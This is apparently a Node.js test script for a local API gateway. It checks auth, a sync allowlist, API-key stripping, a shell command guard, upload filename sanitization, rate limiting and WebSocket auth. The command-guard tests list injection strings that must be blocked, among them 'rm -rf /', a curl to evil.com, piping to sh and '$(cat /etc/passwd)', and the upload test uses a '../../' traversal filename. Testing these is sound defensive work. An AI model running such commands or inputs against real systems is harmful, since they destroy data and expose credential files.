// test-changes.mjs — Manual test suite for all recent gateway changes.
// Run with: node test-changes.mjs

const BASE = 'http://localhost:7400';
const KEY = 'test-secret-12345';
const AUTH = { 'X-Gateway-Key': KEY };
const JSON_HEADERS = { ...AUTH, 'Content-Type': 'application/json' };

let passed = 0;
let failed = 0;

function ok(name, condition, detail = '') {
  if (condition) {
    console.log(`  ✓ ${name}`);
    passed++;
  } else {
    console.log(`  ✗ ${name}${detail ? ' — ' + detail : ''}`);
    failed++;
  }
}

async function get(path, headers = {}) {
  const r = await fetch(BASE + path, { headers });
  return { status: r.status, body: await r.json().catch(() => ({})), headers: r.headers };
}

async function post(path, body, headers = JSON_HEADERS) {
  const r = await fetch(BASE + path, { method: 'POST', headers, body: JSON.stringify(body) });
  return { status: r.status, body: await r.json().catch(() => ({})), headers: r.headers };
}

// ── 1. Health endpoint (public, no auth) ─────────────────────────────────────
console.log('\n[1] Health endpoint');
{
  const r = await get('/api/health');
  ok('returns 200', r.status === 200);
  ok('has status:ok', r.body.status === 'ok');
  ok('has uptime', typeof r.body.uptime === 'number');
}

// ── 2. Auth middleware ────────────────────────────────────────────────────────
console.log('\n[2] Auth middleware');
{
  const no_auth = await get('/api/tasks');
  ok('rejects missing key with 401', no_auth.status === 401);

  const bad_auth = await get('/api/tasks', { 'X-Gateway-Key': 'wrong-key' });
  ok('rejects wrong key with 401', bad_auth.status === 401);

  const good = await get('/api/tasks', AUTH);
  ok('accepts correct key', good.status === 200);
}

// ── 3. Sync endpoint — key allowlist ─────────────────────────────────────────
console.log('\n[3] Sync key allowlist');
{
  const bad = await post('/api/sync', { logins: [], unknownField: 'x' }, JSON_HEADERS);
  ok('rejects unknown sync keys with 400', bad.status === 400);
  ok('error mentions the bad key', bad.body.error?.includes('unknownField'));

  const good = await post('/api/sync', { logins: [], rules: [], settings: {} }, JSON_HEADERS);
  ok('accepts valid sync keys', good.status === 200);
}

// ── 4. Proxy — strips x-api-key from body ────────────────────────────────────
console.log('\n[4] Chat proxy — api key stripping');
{
  // We can't fully test this without hitting Anthropic, but we can confirm
  // the endpoint exists and doesn't crash when given a body with x-api-key
  const r = await post('/api/chat', {
    'x-api-key': 'should-be-stripped',
    model: 'claude-haiku-4-5-20251001',
    max_tokens: 1,
    messages: [{ role: 'user', content: 'hi' }],
  });
  // 200 = Anthropic responded. 4xx = Anthropic rejected (key stripped, our key used).
  // Either way, the gateway didn't crash and didn't use the injected key.
  ok('endpoint responds (key stripping in place)', r.status !== 500);
}

// ── 5. Command guard — metacharacter rejection ────────────────────────────────
console.log('\n[5] Command guard');
{
  const { validateCommand } = await import('./dist/security/command-guard.js').catch(() => null) || {};

  if (validateCommand) {
    const blocked = (cmd) => { try { validateCommand(cmd, []); return false; } catch { return true; } };
    const allowed = (cmd, list) => { try { validateCommand(cmd, list); return true; } catch { return false; } };

    ok('blocks && chaining', blocked('npm test && rm -rf /'));
    ok('blocks ; separator', blocked('npm test; curl evil.com'));
    ok('blocks pipe', blocked('npm test | sh'));
    ok('blocks backtick substitution', blocked('npm test `whoami`'));
    ok('blocks $() substitution', blocked('npm test $(cat /etc/passwd)'));
    ok('blocks newline injection', blocked('npm test\nrm -rf /'));
    ok('allows npm test', allowed('npm test', ['npm test']));
    ok('allows npm test --verbose', allowed('npm test --verbose', ['npm test']));
    ok('allows git log', allowed('git log --oneline', []));
    ok('blocks git push (not on allowlist)', blocked('git push origin main'));
  } else {
    console.log('  ⚠ Build dist/ first to test command guard (pnpm build)');
  }
}

// ── 7. Upload — filename path traversal blocked ───────────────────────────────
console.log('\n[7] Upload — filename sanitization');
{
  const traversal = await post('/api/execute/upload', {
    base64: Buffer.from('test').toString('base64'),
    filename: '../../evil.txt',
  }, JSON_HEADERS);
  // Should succeed but write to brainlink-images/evil.txt (not ../../evil.txt)
  ok('upload succeeds', traversal.status === 200);
  if (traversal.body.path) {
    ok('path stays inside Downloads', traversal.body.path.includes('brainlink-images'));
    ok('traversal stripped from filename', !traversal.body.path.includes('..'));
  }
}

// ── 8. Rate limiting headers present ─────────────────────────────────────────
console.log('\n[8] Rate limiting');
{
  const r = await get('/api/health');
  ok('RateLimit-Limit header present', r.headers.has('ratelimit-limit') || r.headers.has('x-ratelimit-limit'));
}

// ── 9. WebSocket — auth flow ──────────────────────────────────────────────────
console.log('\n[9] WebSocket');
{
  const { WebSocket } = await import('ws');
  await new Promise((resolve) => {
    const ws = new WebSocket('ws://localhost:7400/ws');
    let authed = false;
    const timer = setTimeout(() => {
      ok('WS auth completed within 3s', authed);
      ws.close();
      resolve();
    }, 3000);

    ws.on('open', () => ws.send(JSON.stringify({ type: 'auth', key: KEY })));
    ws.on('message', (data) => {
      const msg = JSON.parse(data.toString());
      if (msg.type === 'auth_ok') {
        authed = true;
        clearTimeout(timer);
        ok('WS connects and authenticates', true);
        ws.close();
        resolve();
      }
      if (msg.type === 'auth_failed') {
        clearTimeout(timer);
        ok('WS connects and authenticates', false, 'auth_failed');
        ws.close();
        resolve();
      }
    });
    ws.on('error', (e) => {
      clearTimeout(timer);
      ok('WS connects', false, e.message);
      resolve();
    });
  });
}

// ── Summary ───────────────────────────────────────────────────────────────────
console.log(`\n${'─'.repeat(50)}`);
console.log(`  ${passed} passed  ${failed > 0 ? failed + ' FAILED' : 'all good'}`);
console.log(`${'─'.repeat(50)}\n`);
if (failed > 0) process.exit(1);
